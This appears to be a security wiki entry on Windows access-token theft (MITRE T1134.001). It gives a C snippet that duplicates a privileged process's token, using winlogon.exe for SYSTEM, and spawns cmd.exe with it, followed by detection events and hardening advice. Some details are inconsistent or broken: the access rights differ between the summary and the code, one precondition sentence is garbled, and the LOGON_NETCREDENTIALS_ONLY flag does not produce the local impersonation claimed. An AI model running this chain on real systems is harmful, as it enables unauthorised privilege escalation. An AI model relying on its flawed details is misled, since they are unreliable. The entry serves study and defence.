---
title: Token Stealing
slug: token-stealing
---

> **TL;DR:** Open a privileged process, grab its primary token, duplicate it, then spawn `cmd.exe` with `CreateProcessWithTokenW` — instant impersonation of the source process's user and privileges.

## What it is
Token stealing (MITRE T1134.001 — Token Impersonation/Theft) is the canonical user-mode privilege-borrowing primitive. Every Windows process owns a primary access token describing its user, groups and privileges. With a handle granting `PROCESS_QUERY_LIMITED_INFORMATION` plus `TOKEN_DUPLICATE` to the target, an attacker can duplicate that token as a new primary token and hand it to `CreateProcessWithTokenW` — the child runs as the target identity without ever needing the password.

## Preconditions / where it applies
- Either Medium-IL admin or possession of `SeDebugPrivilege` to open arbitrary process tokens
- Target process must be running and accessible (same session unhelpful constraints apply for `CreateProcessAsUser` instead)
- Effective until Protected Process Light (PPL) or token-stripping mitigations block the `OpenProcess` call

## Technique
The classic four-call chain. Pick a target PID running as the desired identity (e.g. `winlogon.exe` for `NT AUTHORITY\SYSTEM`) and impersonate.

```c
HANDLE hProc  = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
HANDLE hTok   = NULL, hDup = NULL;
OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
                 SecurityImpersonation, TokenPrimary, &hDup);

STARTUPINFOW si = { sizeof si }; PROCESS_INFORMATION pi = { 0 };
CreateProcessWithTokenW(hDup, LOGON_NETCREDENTIALS_ONLY, NULL,
                        L"C:\\Windows\\System32\\cmd.exe", 0, NULL, NULL, &si, &pi);
```

`CreateProcessWithTokenW` requires `SeImpersonatePrivilege`; if missing, fall back to `CreateProcessAsUserW` (needs `SeAssignPrimaryTokenPrivilege`) or `ImpersonateLoggedOnUser` for thread-only context. See [[tokens-and-privileges]] and [[token-impersonation]] for the privilege model.

## Detection and defence
- 4624 logon event type 9 (`NewCredentials`) when `LOGON_NETCREDENTIALS_ONLY` is used
- 4672 (special-privileges assigned) on the spawned child running as SYSTEM/admin
- EDR hooks on `NtOpenProcessToken` + `NtDuplicateToken` with cross-PID lineage anomalies
- Hardening: enable Credential Guard, restrict `SeDebugPrivilege`, run sensitive services as PPL

## References
- [ired.team — Primary Access Token Manipulation](https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation) — original walkthrough
- [MITRE ATT&CK T1134.001](https://attack.mitre.org/techniques/T1134/001/) — token impersonation/theft mapping
